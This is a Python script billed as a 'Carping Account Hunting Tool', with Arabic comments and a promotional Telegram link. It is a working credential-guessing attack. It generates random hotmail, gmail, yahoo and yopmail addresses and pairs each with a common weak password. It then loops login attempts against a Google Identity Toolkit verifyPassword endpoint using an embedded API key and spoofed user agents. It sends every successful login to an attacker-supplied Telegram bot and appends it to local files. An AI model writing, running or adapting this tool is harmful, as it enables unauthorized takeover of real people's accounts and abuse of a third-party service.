import random
import webbrowser
import requests
import os
from cfonts import render
import time
from user_agent import generate_user_agent as mlham
#— — — — — — — — — — — — —
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#اورق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
HH='\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
W1 = '\x1b[1;97m'
W2 = '\x1b[38;5;120m'
W3 = '\x1b[38;5;204m'
W4 = '\x1b[38;5;150m'
W5 = '\x1b[1;33m'
W6 = '\x1b[1;31m'
W7 = "\033[1;33m"
W8 = '\x1b[2;36m'
W8 = f'\x1b[38;5;117m'
W9 = "\033[1m\033[34m"
#𝐁𝐘@SF7SF0
url="https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
g = render("SF SF", font='block', align='center', colors=['red'], background='white')
print(g)
print(X+'—'*50)
print(f' انضم الى نخبة المبرمجين ')
webbrowser.open('https://t.me/DEW_Pess')
time.sleep(2)
os.system('clear')
print(g)
print(f' {Z} Carping Account Hunting Tool ')
print(f' {Z} By  :{X}SF SF ﴾')
print(f' {Z} Telegram : {X}@SF7SF0')
print(X+'—'*50)
print(f'{Z} [1] ┌──{M}({X} @hotmail.com {M})')
print(f'{Z} [2] ┌──{M}({X} @gmail.com {M})')
print(f'{Z} [3] ┌──{M}({X} @yahoo.com {M})')
print(f'{Z} [4] ┌──{M}({X} @yopmail.com {M})')
print(X+'—'*50)
chooe=int(input(f' {W2} Enter Chooes : '+Z))
os.system('clear')
print(g)
print(X+'—'*50)
print(f' {Z} Carping Account Hunting Tool ')
print(f' {Z} By  : {X}SF SFٰ ﴾')
print(f' {Z} Telegram : {X}@SF7SF0')
print(X+'—'*50)
Token=input(f' {C} TOKEN : '+Z)
ID=input(f' {C} ID : '+Z)
print('انضم الى قناة SF الرسمية')
webbrowser.open('https://t.me/DEW_Pess')
time.sleep(2)
os.system('clear')
if chooe == 1:
	print(F+' A hunting command was executed @hotmail.com')
	time.sleep(2)
	os.system('clear')
	while True:
		hotmail1=''.join(random.choice('qwertyuiopasdfghjklmnvbcxz')for i in range(4))+'@hotmail.com'
		pas_hotmail=random.choice(['123456','1234567','12345678','123456789'])
		payload = {
			    "email":hotmail1,
			    "password": pas_hotmail,
			    "returnSecureToken": True,
			    "clientType": "CLIENT_TYPE_ANDROID"
			}
			
		headers = {
			  'User-Agent': str(mlham()),
			  'Accept-Encoding': "deflate, gzip",
			  'Content-Type': "application/json",
			  'X-Unity-Version': "2022.3.62f2",
			  #'App-Id':'2571400'
			}
			
		re = requests.post(url, json=payload, headers=headers).text
		if 'idToken' in re:
			print(f' {F} Good : {X} {hotmail1} - {pas_hotmail}')
			T = (f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=  
   𝐆𝐎𝐃
━━━━━━━━━━━━━
Email : {hotmail1}
Pass  : {pas_hotmail}
━━━━━━━━━━━━━

By : @SF7SF0 | @SF7SF0
  ''')
			i = requests.post(T)
			with open('Car-hotmail.com','a') as h:
				h.write(hotmail1 + ' | ' + pas_hotmail)
		else:
			print(f' {Z} Bad : {X} {hotmail1} - {pas_hotmail}')
			
if chooe == 2:
	print(F+'Account hunting option has been initiated @gmail.com')
	time.sleep(2)
	os.system('clear')
	while True:
		gmail1=''.join(random.choice('qwertyuiopasdfghjklzxcvbnm')for i in range(5,9))+'@gmail.com'
		pas_gmail=random.choice(['123456','1234567','12345678','123456789'])
		payload = {
			    "email":gmail1,
			    "password": pas_gmail,
			    "returnSecureToken": True,
			    "clientType": "CLIENT_TYPE_ANDROID"
			}
			
		headers = {
			  'User-Agent': str(mlham()),
			  'Accept-Encoding': "deflate, gzip",
			  'Content-Type': "application/json",
			  'X-Unity-Version': "2022.3.62f2",
			  #'App-Id':'2571400'
			}
			
		re = requests.post(url, json=payload, headers=headers).text
		if 'idToken' in re:
			print(f' {F} Good : {X} {gmail1} - {pas_gmail}')
			T = (f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=  
   𝐆𝐎𝐃
━━━━━━━━━━━━━
Email : {gmail1}
Pass  : {pas_gmail}
━━━━━━━━━━━━━

By : @SF7SF0 | @SF7SF0
  ''')
			i = requests.post(T)
			with open('Car-@gmail.com','a') as g:
				g.write(gmail1 + ' | ' + pas_gmail)
		else:
			print(f' {Z} Bad : {X} {gmail1} - {pas_gmail}')
			
if chooe == 3:
	print(F+'The option to hunt accounts has been initiated @yahoo.com')
	time.sleep(2)
	os.system('clear')
	while True:
		yahoo1=''.join(random.choice('qwertyuiopasdfghjklzxcvbnm')for i in range(5,9))+'@yahoo.com'
		yaho_pas=random.choice(['123456','1234567','12345678','123456789'])
		payload = {
			    "email":yahoo1,
			    "password": yaho_pas,
			    "returnSecureToken": True,
			    "clientType": "CLIENT_TYPE_ANDROID"
			}
			
		headers = {
			  'User-Agent': str(mlham()),
			  'Accept-Encoding': "deflate, gzip",
			  'Content-Type': "application/json",
			  'X-Unity-Version': "2022.3.62f2",
			  #'App-Id':'2571400'
			}
			
		re = requests.post(url, json=payload, headers=headers).text
		if 'idToken' in re:
			print(f' {F} Good : {X} {yahoo1} | {yaho_pas}')
			T = (f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=  
   𝐆𝐎𝐃
━━━━━━━━━━━━━
Email : {yahoo1}
Pass  : {yaho_pas}
━━━━━━━━━━━━━

By : @SF7SF0 | @SF7SF0
  ''')
			i = requests.post(T)
			with open('Car-@yahoo.com','a') as y:
				y.write(yahoo1 + ' | ' + yaho_pas)
		else:
			print(f' {Z} Bad : {X} {yahoo1} | {yaho_pas}')
			
if chooe == 4:
	print(F+'Account hunting has begun @yopmail')
	time.sleep(2)
	os.system('clear')
	while True:
		yopmail1=''.join(random.choice('qwertyuiopasdfghjklzxcvbnm1234567890')for i in range(5,9))
		yop_pas=random.choice(['123456','1234567','12345678','123456789'])
		payload = {
			    "email":yopmail1,
			    "password": yop_pas,
			    "returnSecureToken": True,
			    "clientType": "CLIENT_TYPE_ANDROID"
			}
			
		headers = {
			  'User-Agent': str(mlham()),
			  'Accept-Encoding': "deflate, gzip",
			  'Content-Type': "application/json",
			  'X-Unity-Version': "2022.3.62f2",
			  #'App-Id':'2571400'
			}
			
		re = requests.post(url, json=payload, headers=headers).text
		if 'idToken' in re:
			print(f' {F} Good : {X}{yopmail1} | {yop_pas}')
			T = (f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=  
   𝐆𝐎𝐃
━━━━━━━━━━━━━
Email : {yopmail1}
Pass  : {yop_pas}
━━━━━━━━━━━━━

By : @SF7SF0 | @SF7SF0
  ''')
			i = requests.post(T)
			with open('Car-@yopmail.com','a') as yo:
				yo.write(yopmail1 + ' | ' + yop_pas)
		else:
			print(f' {Z} Bad : {X}{yopmail1} | {yop_pas}')	